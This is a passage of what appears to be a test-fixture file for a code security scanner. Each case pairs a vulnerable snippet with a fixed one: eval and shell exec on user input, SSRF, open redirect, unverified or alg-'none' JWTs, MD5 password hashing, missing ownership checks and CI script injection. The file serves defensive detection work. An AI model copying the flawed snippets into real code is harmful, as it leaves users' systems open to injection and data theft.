    ignores: f('app/api/users/route.ts', "import { db } from '@/lib/db';\nexport async function GET(req: Request) {\n  const id = new URL(req.url).searchParams.get('id');\n  const rows = await db.query('SELECT * FROM users WHERE id = $1', [id]);\n  return Response.json(rows);\n}\n")
  },

  {
    ruleIds: [6051],
    name: 'Migration that locks an existing table',
    detects: f('supabase/migrations/003.sql', 'ALTER TABLE orders ADD COLUMN region text NOT NULL;\nCREATE INDEX idx_orders_user ON orders(user_id);\n'),
    ignores: f('supabase/migrations/003.sql', "ALTER TABLE orders ADD COLUMN region text NOT NULL DEFAULT 'eu';\nCREATE INDEX CONCURRENTLY idx_orders_user ON orders(user_id);\nCREATE TABLE refunds (id uuid primary key, order_id uuid);\nCREATE INDEX idx_refunds_order ON refunds(order_id);\n")
  },
  {
    ruleIds: [9106],
    name: 'IDOR: service-role lookup by request id',
    detects: f('app/api/invoices/[id]/route.ts', "import { createClient } from '@supabase/supabase-js';\nconst admin = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const { data } = await admin.from('invoices').select('*').eq('id', params.id).single();\n  return Response.json(data);\n}\n"),
    ignores: f('app/api/invoices/[id]/route.ts', "import { createClient } from '@supabase/supabase-js';\nconst admin = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const { data: { user } } = await admin.auth.getUser(req.headers.get('authorization') ?? '');\n  if (!user) return new Response('unauthorized', { status: 401 });\n  const { data } = await admin.from('invoices').select('*').eq('id', params.id).eq('user_id', user.id).single();\n  return Response.json(data);\n}\n")
  },

  // ─── Injection & web ──────────────────────────────────────────────────
  {
    ruleIds: [32],
    name: 'eval on user input',
    detects: f('lib/calc.ts', 'export function calc(input: string) {\n  return eval(input);\n}\n'),
    ignores: f('lib/calc.ts', 'export function calc(input: string) {\n  return JSON.parse(input);\n}\n')
  },
  {
    ruleIds: [32],
    name: 'Python eval on input vs Redis Lua eval, MLX eval and a Java method named eval',
    detects: f('app/calc.py', 'def calc(expr):\n    return eval(expr)\n'),
    ignores: [
      ...f('app/locks.py', 'async def acquire(redis, key, token):\n    return await redis.eval(ACQUIRE_LUA, 1, key, token)\n'),
      ...f('app/model.py', 'import mlx.core as mx\n\ndef step(x):\n    mx.eval(x)\n    return x\n'),
      ...f('src/main/java/udtf/Labels.java', 'public class Labels {\n  public void eval(Integer id, String labels) {\n    collect(labels);\n  }\n}\n'),
    ],
  },
  {
    ruleIds: [33],
    name: 'Command injection via shell exec',
    detects: f('app/api/ping/route.ts', "import { exec } from 'child_process';\nexport async function GET(req: Request) {\n  const host = new URL(req.url).searchParams.get('host');\n  exec(`ping -c 1 ${host}`);\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/ping/route.ts', "import { execFile } from 'child_process';\nexport async function GET(req: Request) {\n  const host = new URL(req.url).searchParams.get('host') ?? '';\n  if (!/^[a-z0-9.-]+$/i.test(host)) return new Response('bad', { status: 400 });\n  execFile('ping', ['-c', '1', host]);\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [34],
    name: 'SSRF via user-controlled fetch URL',
    detects: f('app/api/fetch/route.ts', "export async function GET(req: Request) {\n  const url = new URL(req.url).searchParams.get('url')!;\n  const r = await fetch(url);\n  return new Response(await r.text());\n}\n"),
    ignores: f('app/api/fetch/route.ts', "const ALLOWED = new Set(['api.github.com']);\nexport async function GET(req: Request) {\n  const target = new URL(new URL(req.url).searchParams.get('url')!);\n  if (!ALLOWED.has(target.hostname)) return new Response('forbidden', { status: 403 });\n  const r = await fetch(target, { signal: AbortSignal.timeout(5000) });\n  return new Response(await r.text());\n}\n")
  },
  {
    ruleIds: [8],
    name: 'Wildcard CORS origin',
    detects: f('server/app.ts', "app.use(cors({ origin: '*' }));\n"),
    ignores: f('server/app.ts', 'app.use(cors({ origin: process.env.PRODUCTION_CLIENT_URL }));\n')
  },
  {
    ruleIds: [41],
    name: 'Open redirect to user-supplied URL',
    detects: f('app/api/redirect/route.ts', "import { redirect } from 'next/navigation';\nexport async function GET(req: Request) {\n  const next = new URL(req.url).searchParams.get('next')!;\n  redirect(next);\n}\n"),
    ignores: f('app/api/redirect/route.ts', "import { redirect } from 'next/navigation';\nexport async function GET(req: Request) {\n  const next = new URL(req.url).searchParams.get('next') ?? '/';\n  redirect(next.startsWith('/') && !next.startsWith('//') ? next : '/');\n}\n")
  },
  {
    ruleIds: [16],
    name: 'Unsanitized innerHTML',
    detects: f('components/Post.tsx', 'export const Post = ({ html }: { html: string }) => <div dangerouslySetInnerHTML={{ __html: html }} />;\n'),
    ignores: f('app/layout.tsx', 'const ld = { "@context": "https://schema.org" };\nexport const Ld = () => <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(ld) }} />;\n')
  },
  {
    ruleIds: [16],
    name: 'innerHTML set from a message vs from an icon helper call',
    detects: f('src/views/inbox.js', 'export function show(el, message) {\n  el.innerHTML = message.body;\n}\n'),
    ignores: f('src/views/selfsign.js', "import { icon } from './icons.js';\nexport function done(btn) {\n  btn.innerHTML = icon('check', 16, 2.4);\n}\n"),
  },

  // ─── Auth & crypto ────────────────────────────────────────────────────
  {
    ruleIds: [39],
    name: 'JWT decoded without verification',
    detects: f('middleware.ts', "import jwt from 'jsonwebtoken';\nexport function middleware(req: any) {\n  const user = jwt.decode(req.cookies.get('token').value);\n  if (user) return;\n}\n"),
    ignores: f('middleware.ts', "import jwt from 'jsonwebtoken';\nexport function middleware(req: any) {\n  const user = jwt.verify(req.cookies.get('token').value, process.env.JWT_SECRET!, { algorithms: ['HS256'] });\n  if (user) return;\n}\n")
  },
  {
    ruleIds: [28],
    name: "JWT verify accepting alg 'none'",
    detects: f('lib/auth.ts', "import jwt from 'jsonwebtoken';\nexport const verify = (t: string) => jwt.verify(t, process.env.JWT_SECRET!, { algorithms: ['none'] });\n"),
    ignores: f('lib/auth.ts', "import jwt from 'jsonwebtoken';\nexport const verify = (t: string) => jwt.verify(t, process.env.JWT_SECRET!, { algorithms: ['HS256'] });\n")
  },
  {
    ruleIds: [37],
    name: 'MD5 password hashing',
    detects: f('lib/hash.ts', "import crypto from 'crypto';\nexport const hashPassword = (p: string) => crypto.createHash('md5').update(p).digest('hex');\n"),
    ignores: f('lib/hash.ts', "import crypto from 'crypto';\nexport const hashPassword = (p: string, salt: Buffer) => crypto.scryptSync(p, salt, 64).toString('hex');\n")
  },
  {
    ruleIds: [38],
    name: 'Math.random for security tokens',
    detects: f('lib/token.ts', 'export const resetToken = () => Math.random().toString(36).slice(2);\n'),
    ignores: f('lib/token.ts', "import crypto from 'crypto';\nexport const resetToken = () => crypto.randomBytes(32).toString('hex');\n")
  },

  // ─── Payments ─────────────────────────────────────────────────────────
  {
    ruleIds: [9704, 8143],
    name: 'Payment webhook without signature verification',
    detects: f('app/api/stripe/webhook/route.ts', "export async function POST(req: Request) {\n  const event = await req.json();\n  if (event.type === 'checkout.session.completed') { await grantPro(event.data.object.customer); }\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/stripe/webhook/route.ts', "import Stripe from 'stripe';\nconst stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);\nexport async function POST(req: Request) {\n  const sig = req.headers.get('stripe-signature')!;\n  const event = stripe.webhooks.constructEvent(await req.text(), sig, process.env.STRIPE_WEBHOOK_SECRET!);\n  if (event.type === 'checkout.session.completed') { await grantPro(event.data.object); }\n  return new Response('ok');\n}\n")
  },

  // ─── LLM cost ─────────────────────────────────────────────────────────
  {
    ruleIds: [141, 4001],
    name: 'LLM call without max_tokens',
    detects: f('app/api/chat/route.ts', "import OpenAI from 'openai';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  const { prompt } = await req.json();\n  const r = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }] });\n  return Response.json(r);\n}\n"),
    ignores: f('app/api/chat/route.ts', "import OpenAI from 'openai';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  const { prompt } = await req.json();\n  const r = await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 512, messages: [{ role: 'user', content: String(prompt).slice(0, 4000) }] });\n  return Response.json(r);\n}\n")
  },

  {
    ruleIds: [10402],
    name: 'AI endpoint without rate limiting',
    detects: f('app/api/chat/route.ts', "import OpenAI from 'openai';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  const { prompt } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 256, messages: [{ role: 'user', content: prompt }] }));\n}\n"),
    ignores: [
      { path: 'app/api/chat/route.ts', content: "import OpenAI from 'openai';\nimport { rateLimit } from '@/lib/rate-limit';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  await rateLimit(req);\n  const { prompt } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 256, messages: [{ role: 'user', content: prompt }] }));\n}\n" },
      { path: 'app/api/login/route.ts', content: "export async function POST(req: Request) {\n  const body = await req.json();\n  return Response.json({ ok: Boolean(body.email) });\n}\n" },
      // Twilio's client.messages.create sends an SMS; it is not an AI call (SMS limits are XL-12's job)
      { path: 'app/api/notify/route.ts', content: "import twilio from 'twilio';\nconst client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);\nexport async function POST(req: Request) {\n  const { phone } = await req.json();\n  await client.messages.create({ to: phone, from: process.env.TWILIO_FROM, body: 'Your order shipped' });\n  return Response.json({ sent: true });\n}\n" }
    ]
  },
  {
    ruleIds: [10402],
    name: 'Anthropic messages.create endpoint without rate limiting is still an AI endpoint',
    detects: f('app/api/assistant/route.ts', "import Anthropic from '@anthropic-ai/sdk';\nconst client = new Anthropic();\nexport async function POST(req: Request) {\n  const { prompt } = await req.json();\n  return Response.json(await client.messages.create({ model: 'claude-haiku-5-5', max_tokens: 256, messages: [{ role: 'user', content: prompt }] }));\n}\n"),
    ignores: f('app/api/assistant/route.ts', "import Anthropic from '@anthropic-ai/sdk';\nimport { rateLimit } from '@/lib/rate-limit';\nconst client = new Anthropic();\nexport async function POST(req: Request) {\n  await rateLimit(req);\n  const { prompt } = await req.json();\n  return Response.json(await client.messages.create({ model: 'claude-haiku-5-5', max_tokens: 256, messages: [{ role: 'user', content: prompt }] }));\n}\n")
  },

  // ─── Logging ──────────────────────────────────────────────────────────
  {
    ruleIds: [21, 8201, 12101],
    name: 'Credentials written to logs',
    detects: f('app/api/login/route.ts', "export async function POST(req: Request) {\n  const body = await req.json();\n  console.log('login attempt', body.password, req.headers.get('authorization'));\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/login/route.ts', "export async function POST(req: Request) {\n  const body = await req.json();\n  console.info('login attempt', { email: hashEmail(body.email) });\n  return new Response('ok');\n}\n")
  },

  // ─── SaaS core (SAAS-01..08) ──────────────────────────────────────────
  {
    ruleIds: [23001],
    name: 'RLS policy open to every signed-in user',
    detects: f('supabase/migrations/010.sql', 'CREATE POLICY "read" ON public.invoices FOR SELECT TO authenticated USING (auth.uid() IS NOT NULL);\n'),
    ignores: f('supabase/migrations/010.sql', 'CREATE POLICY "read" ON public.invoices FOR SELECT TO authenticated USING (auth.uid() = user_id);\n')
  },
  {
    ruleIds: [23002],
    name: 'Supabase getSession() used for server authorization',
    detects: f('app/api/projects/route.ts', "export async function GET() {\n  const supabase = await createClient();\n  const { data: { session } } = await supabase.auth.getSession();\n  if (!session) return new Response('unauthorized', { status: 401 });\n  return Response.json(await listProjects(session.user.id));\n}\n"),
    ignores: [
      { path: 'app/api/projects/route.ts', content: "export async function GET() {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  if (!user) return new Response('unauthorized', { status: 401 });\n  return Response.json(await listProjects(user.id));\n}\n" },
      { path: 'components/AuthButton.tsx', content: "'use client';\nexport function AuthButton() {\n  useEffect(() => { supabase.auth.getSession().then(({ data }) => setSession(data.session)); }, []);\n  return null;\n}\n" }
    ]
  },
  {
    ruleIds: [23003],
    name: 'SECURITY DEFINER function without search_path',
    detects: f('supabase/migrations/011.sql', "CREATE OR REPLACE FUNCTION public.is_admin()\nRETURNS boolean\nLANGUAGE sql\nSECURITY DEFINER\nAS $$\n  SELECT EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin');\n$$;\n"),
    ignores: f('supabase/migrations/011.sql', "CREATE OR REPLACE FUNCTION public.is_admin()\nRETURNS boolean\nLANGUAGE sql\nSECURITY DEFINER\nSET search_path = ''\nAS $$\n  SELECT EXISTS (SELECT 1 FROM public.profiles WHERE id = auth.uid() AND role = 'admin');\n$$;\n")
  },
  {
    ruleIds: [23003],
    name: 'SECURITY DEFINER fixed by a later migration (cross-file)',
    detects: f('supabase/migrations/20260101_quota.sql', "CREATE OR REPLACE FUNCTION public.reserve_quota(p_user uuid)\nRETURNS void\nLANGUAGE plpgsql\nSECURITY DEFINER\nAS $$\nBEGIN\n  UPDATE public.subscriptions SET used = used + 1 WHERE user_id = p_user;\nEND;\n$$;\n"),
    ignores: [
      { path: 'supabase/migrations/20260101_quota.sql', content: "CREATE OR REPLACE FUNCTION public.reserve_quota(p_user uuid)\nRETURNS void\nLANGUAGE plpgsql\nSECURITY DEFINER\nAS $$\nBEGIN\n  UPDATE public.subscriptions SET used = used + 1 WHERE user_id = p_user;\nEND;\n$$;\n" },
      { path: 'supabase/migrations/20260301_harden.sql', content: "ALTER FUNCTION public.reserve_quota(uuid) SET search_path = '';\n" }
    ]
  },
  {
    ruleIds: [23004],
    name: 'Checkout price chosen by the client',
    detects: f('app/api/checkout/route.ts', "export async function POST(req: Request) {\n  const { priceId } = await req.json();\n  const session = await stripe.checkout.sessions.create({ mode: 'subscription', line_items: [{ price: priceId, quantity: 1 }] });\n  return Response.json({ url: session.url });\n}\n"),
    ignores: f('app/api/checkout/route.ts', "const PRICES = { pro: process.env.STRIPE_PRICE_PRO!, team: process.env.STRIPE_PRICE_TEAM! };\nexport async function POST(req: Request) {\n  const { plan } = await req.json();\n  const price = PRICES[plan as keyof typeof PRICES];\n  if (!price) return new Response('bad plan', { status: 400 });\n  const session = await stripe.checkout.sessions.create({ mode: 'subscription', line_items: [{ price, quantity: 1 }] });\n  return Response.json({ url: session.url });\n}\n")
  },
  {
    ruleIds: [23005],
    name: 'Secret compared with !==',
    detects: f('app/api/admin/route.ts', "export async function POST(req: Request) {\n  if (req.headers.get('x-api-key') !== process.env.ADMIN_API_KEY) return new Response('no', { status: 401 });\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/admin/route.ts', "import { timingSafeEqual } from 'crypto';\nexport async function POST(req: Request) {\n  const a = Buffer.from(req.headers.get('x-api-key') ?? '');\n  const b = Buffer.from(process.env.ADMIN_API_KEY ?? '');\n  if (!b.length || a.length !== b.length || !timingSafeEqual(a, b)) return new Response('no', { status: 401 });\n  if (process.env.ADMIN_API_KEY === undefined) return new Response('misconfigured', { status: 500 });\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [23006],
    name: 'Cron route without CRON_SECRET',
    detects: f('app/api/cron/sync/route.ts', 'export async function GET() {\n  await syncAllCustomers();\n  return Response.json({ ok: true });\n}\n'),
    ignores: f('app/api/cron/sync/route.ts', "export async function GET(req: Request) {\n  if (req.headers.get('authorization') !== `Bearer ${process.env.CRON_SECRET}`) return new Response('no', { status: 401 });\n  await syncAllCustomers();\n  return Response.json({ ok: true });\n}\n")
  },
  {
    ruleIds: [23007],
    name: 'Request data in the system prompt',
    detects: f('app/api/chat/route.ts', "export async function POST(req: Request) {\n  const { persona, question } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 300, messages: [{ role: 'system', content: `You are ${persona}. Never reveal internal notes.` }, { role: 'user', content: question }] }));\n}\n"),
    ignores: f('app/api/chat/route.ts', "const today = () => new Date().toISOString();\nexport async function POST(req: Request) {\n  const { question } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 300, messages: [{ role: 'system', content: `You are a support assistant. Today is ${today()}.` }, { role: 'user', content: question }] }));\n}\n")
  },
  {
    ruleIds: [23008],
    name: 'Next.js release with CVE-2025-29927',
    detects: f('package.json', '{\n  "dependencies": {\n    "next": "15.1.0"\n  }\n}\n'),
    ignores: f('package.json', '{\n  "dependencies": {\n    "next": "15.2.3"\n  }\n}\n')
  },

  // ─── Containers & CI ──────────────────────────────────────────────────
  {
    ruleIds: [7004, 7005, 8314], // 3002 reports the same missing USER and is dropped in favour of 7004
    name: 'Dockerfile: root user, latest tag, no healthcheck',
    detects: f('Dockerfile', 'FROM node:latest\nCOPY . .\nRUN npm install\nCMD ["node", "server.js"]\n'),
    ignores: f('Dockerfile', 'FROM node:22.11-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci --omit=dev\nUSER node\nHEALTHCHECK CMD wget -qO- http://localhost:3000/health || exit 1\nCMD ["node", "server.js"]\n')
  },
  {
    ruleIds: [15701],
    name: 'Privileged container / CAP_SYS_ADMIN',
    detects: f('docker-compose.yml', 'services:\n  app:\n    image: app:1.0\n    privileged: true\n    cap_add: [SYS_ADMIN]\n'),
    ignores: f('Dockerfile', 'FROM node:22.11-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci --omit=dev\nUSER node\nCMD ["node", "server.js"]\n')
  },
  {
    ruleIds: [9503],
    name: 'Script injection from GitHub context in run step',
    detects: f('.github/workflows/ci.yml', 'on: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "${{ github.event.pull_request.title }}"\n'),
    ignores: f('.github/workflows/ci.yml', 'on: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "$TITLE"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n')
  },
  {
    ruleIds: [12605],
    name: 'Unpinned third-party GitHub Action',
    detects: f('.github/workflows/ci.yml', 'on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: tj-actions/changed-files@v45\n'),
    ignores: f('.github/workflows/ci.yml', 'on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: tj-actions/changed-files@c3a1bb2c992d77180ae65be6ae6c166cf40f857c\n      - uses: actions/checkout@v4\n')
  },
  {
    ruleIds: [12603],
    name: 'Release pipeline with mutable action tags and no provenance',
    detects: f('.github/workflows/release.yml', 'on:\n  push:\n    tags: ["v*"]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm publish\n'),
    ignores: [
      { path: '.github/workflows/release.yml', content: 'on:\n  push:\n    tags: ["v*"]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n      - run: npm publish --provenance\n' },
      { path: '.github/dependabot.yml', content: 'version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    schedule:\n      interval: weekly\n' }
    ]
  },
  {
    ruleIds: [10705],
    name: 'Large uncompressed JSON blob written to cache',
    detects: f('lib/cache.ts', 'export const save = (k: string, v: object) => redis.set(k, JSON.stringify(v));\n'),
    ignores: [
      { path: 'lib/cache.ts', content: "import { gzipSync } from 'zlib';\nexport const save = (k: string, v: object) => redis.set(k, gzipSync(JSON.stringify(v)));\n" },
      { path: 'app/api/x/route.ts', content: 'export const GET = () => new Response(JSON.stringify({ ok: true }));\n' }
    ]
  },
  {
    ruleIds: [9502],
    name: 'third-party GitHub Action pinned to a mutable tag',
    detects: f('.github/workflows/deploy.yml', 'on: push\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: some-org/deploy-action@v2\n'),
    ignores: f('.github/workflows/deploy.yml', 'on: push\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: some-org/deploy-action@0123456789abcdef0123456789abcdef01234567\n')
  },
  {
    ruleIds: [7323, 9501],
    name: 'pull_request_target with untrusted checkout',
    detects: f('.github/workflows/ci.yml', 'on: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n'),
    ignores: f('.github/workflows/ci.yml', 'on: pull_request\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n      - run: npm ci && npm test\n')
  },

  // ─── Calibration batch 1: previously unproven CRITICAL rules ─────────
  {
    ruleIds: [17],
    name: 'Record fetched by URL id without ownership check (BOLA)',
    detects: f('app/api/invoices/[id]/route.ts', "import { prisma } from '@/lib/db';\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const invoice = await prisma.invoice.findUnique({ where: { id: params.id } });\n  return Response.json(invoice);\n}\n"),
    ignores: f('app/api/invoices/[id]/route.ts', "import { prisma } from '@/lib/db';\nimport { auth } from '@/lib/auth';\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const session = await auth();\n  const invoice = await prisma.invoice.findFirst({ where: { id: params.id, ownerId: session.user.id } });\n  return Response.json(invoice);\n}\n")
  },
  {
    ruleIds: [19],
    name: 'LLM agent with destructive tools and no approval step',
    detects: f('lib/agent.ts', "export const run = (prompt: string) => generateText({ model, prompt, tools: [searchDocs, deleteDatabase, sendEmail] });\n"),
    ignores: f('lib/agent.ts', "export const run = (prompt: string) => generateText({ model, prompt, tools: [searchDocs, deleteDatabase, sendEmail], onToolCall: requireApproval });\n")
  },
  {
    ruleIds: [22],
    name: 'LLM SDK used directly in a client component',
    detects: f('components/Chat.tsx', "'use client';\nimport OpenAI from 'openai';\nconst client = new OpenAI({ apiKey: process.env.NEXT_PUBLIC_OPENAI_KEY, dangerouslyAllowBrowser: true });\nexport function Chat() { return null; }\n"),
    ignores: f('components/Chat.tsx', "'use client';\nexport function Chat() {\n  const send = (m: string) => fetch('/api/chat', { method: 'POST', body: m });\n  return <button onClick={() => send('hi')}>Send</button>;\n}\n")
  },
  {
    ruleIds: [24],
    name: 'File read from a user-controlled path',
    detects: f('app/api/files/route.ts', "import { readFile } from 'fs/promises';\nexport async function GET(req: Request) {\n  const { searchParams } = new URL(req.url);\n  const data = await readFile(`./uploads/${searchParams.get('name')}`);\n  return new Response(data);\n}\n"),
    ignores: f('app/api/files/route.ts', "import { readFile } from 'fs/promises';\nimport path from 'path';\nexport async function GET(req: Request) {\n  const { searchParams } = new URL(req.url);\n  const name = path.basename(searchParams.get('name') ?? '');\n  const data = await readFile(path.join('./uploads', name));\n  return new Response(data);\n}\n")
  },
  {
    ruleIds: [31],
    name: 'YAML loader that instantiates arbitrary objects',
    detects: f('app/config.py', 'import yaml\n\ndef load(path):\n    with open(path) as f:\n        return yaml.load(f, Loader=yaml.Loader)\n'),
    ignores: [
      { path: 'app/config.py', content: 'import yaml\n\ndef load(path):\n    with open(path) as f:\n        return yaml.safe_load(f)\n' },
      // js-yaml 4: load() uses the safe default schema
      { path: 'lib/config.ts', content: "import yaml from 'js-yaml';\nexport const parse = (text: string) => yaml.load(text);\n" }
    ]
  },
  {
    ruleIds: [4003],
    name: 'LLM output passed to eval',
    detects: f('lib/agent-run.ts', "export async function run(prompt: string) {\n  const completion = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }], max_tokens: 500 });\n  return eval(completion.choices[0].message.content ?? '');\n}\n"),
    ignores: f('lib/agent-run.ts', "export async function run(prompt: string) {\n  const completion = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }], max_tokens: 500 });\n  return JSON.parse(completion.choices[0].message.content ?? '{}');\n}\n")
  },
  {
    ruleIds: [4004],
    name: 'Signed-in user search over all tenants\' embeddings',
    detects: f('app/api/search/route.ts', "import { createClient } from '@/lib/supabase/server';\nexport async function POST(req: Request) {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5 });\n  return Response.json(data);\n}\n"),
    ignores: [
      { path: 'app/api/search/route.ts', content: "import { createClient } from '@/lib/supabase/server';\nexport async function POST(req: Request) {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5, filter_user_id: user.id });\n  return Response.json(data);\n}\n" },
      { path: 'lib/rag.ts', content: "export async function retrieve(vector: number[], session: Session) {\n  return pc.index('docs').namespace(session.user.id).query({ vector, topK: 5 });\n}\n" },
      // Public docs search without any user context is not multi-tenant
      { path: 'app/api/docs-search/route.ts', content: "export async function POST(req: Request) {\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5 });\n  return Response.json(data);\n}\n" }
    ]
  },
  {
    ruleIds: [4004],
    name: 'Pinecone query without tenant filter',
    detects: f('lib/rag.ts', "export async function retrieve(vector: number[], session: Session) {\n  if (!session.user) throw new Error('unauthenticated');\n  const index = pc.index('docs');\n  return index.query({ vector, topK: 5, includeMetadata: true });\n}\n"),
    ignores: f('lib/rag.ts', "export async function retrieve(vector: number[], session: Session) {\n  const index = pc.index('docs');\n  return index.query({ vector, topK: 5, filter: { userId: session.user.id } });\n}\n")
  },
  {
    ruleIds: [6005],
    name: 'pg Pool created inside the request handler',
    detects: f('app/api/users/route.ts', "import { Pool } from 'pg';\nexport async function GET() {\n  const pool = new Pool({ connectionString: process.env.DATABASE_URL });\n  const { rows } = await pool.query('select id from users');\n  return Response.json(rows);\n}\n"),
    ignores: f('app/api/users/route.ts', "import { Pool } from 'pg';\nconst pool = new Pool({ connectionString: process.env.DATABASE_URL });\nexport async function GET() {\n  const { rows } = await pool.query('select id from users');\n  return Response.json(rows);\n}\n")
  },
  {
    ruleIds: [6009],
    name: 'External HTTP call inside a database transaction',
    detects: f('lib/orders.ts', "export async function place(data: OrderInput) {\n  await prisma.$transaction(async (tx) => {\n    await tx.order.create({ data });\n    await fetch('https://api.shipping.example/label', { method: 'POST' });\n  });\n}\n"),
    ignores: f('lib/orders.ts', "export async function place(data: OrderInput) {\n  await prisma.$transaction(async (tx) => {\n    await tx.order.create({ data });\n  });\n  await fetch('https://api.shipping.example/label', { method: 'POST' });\n}\n")
  },
  {
    ruleIds: [6015],
    name: 'Pooled pg client never released',
    detects: f('lib/report.ts', "export async function report() {\n  const client = await pool.connect();\n  const res = await client.query('select count(*) from orders');\n  return res.rows[0];\n}\n"),
    ignores: f('lib/report.ts', "export async function report() {\n  const client = await pool.connect();\n  try {\n    const res = await client.query('select count(*) from orders');\n    return res.rows[0];\n  } finally {\n    client.release();\n  }\n}\n")
  },
  {
    ruleIds: [6038],
    name: 'Production database URL with password in source',
    detects: f('lib/db.ts', 'export const DATABASE_URL = "postgresql://admin:S3cretPass@db.prod.example.com:5432/app";\n'),
    ignores: f('lib/db.ts', 'export const DATABASE_URL = process.env.DATABASE_URL;\n')
  },
  {
    ruleIds: [7215],
    name: 'GET handler that deletes data',
    detects: f('app/api/unsubscribe/route.ts', "export async function GET(req: Request) {\n  const token = new URL(req.url).searchParams.get('token') ?? '';\n  await prisma.subscription.delete({ where: { token } });\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/unsubscribe/route.ts', "export async function GET(req: Request) {\n  const url = new URL(req.url);\n  url.searchParams.delete('utm_source');\n  const sub = await prisma.subscription.findUnique({ where: { token: url.searchParams.get('token') ?? '' } });\n  return Response.json({ confirm: Boolean(sub) });\n}\nexport async function POST(req: Request) {\n  const { token } = await req.json();\n  await prisma.subscription.delete({ where: { token } });\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [15],
    name: 'API mutation route without an auth check',
    detects: f('app/api/posts/route.ts', "import { db } from '@/lib/db';\nexport async function POST(req: Request) {\n  const body = await req.json();\n  await db.post.create({ data: body });\n  return new Response('ok');\n}\n"),
    ignores: [
      { path: 'app/api/posts/route.ts', content: "import { db } from '@/lib/db';\nimport { auth } from '@/lib/auth';\nexport async function POST(req: Request) {\n  const session = await auth();\n  if (!session) return new Response(null, { status: 401 });\n  await db.post.create({ data: await req.json() });\n  return new Response('ok');\n}\n" },
      // vercel/commerce: the secret check lives in the imported revalidate()
      { path: 'app/api/revalidate/route.ts', content: "import { revalidate } from 'lib/shopify';\nimport { NextRequest, NextResponse } from 'next/server';\n\nexport async function POST(req: NextRequest): Promise<NextResponse> {\n  return revalidate(req);\n}\n" }
    ]
  },
  {
    ruleIds: [7218],
    name: 'Debug endpoint without authentication',
    detects: f('app/api/debug/route.ts', 'export async function GET() {\n  return Response.json({ env: process.env.NODE_ENV, memory: process.memoryUsage() });\n}\n'),
    ignores: f('app/api/debug/route.ts', "export async function GET() {\n  const session = await getServerSession();\n  if (!session) return new Response(null, { status: 401 });\n  return Response.json({ memory: process.memoryUsage() });\n}\n")
  },
  {
    ruleIds: [7242],
    name: 'WebSocket server without origin check',
    detects: f('server/ws.ts', "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080 });\n"),
    ignores: [
      { path: 'server/ws.ts', content: "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080, verifyClient: ({ origin }) => ALLOWED.has(origin) });\n" },
      { path: 'server/ws2.ts', content: "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080 });\nwss.on('connection', (ws, req) => { if (!ALLOWED.has(req.headers.origin ?? '')) ws.close(); });\n" }
    ]
  },
  {
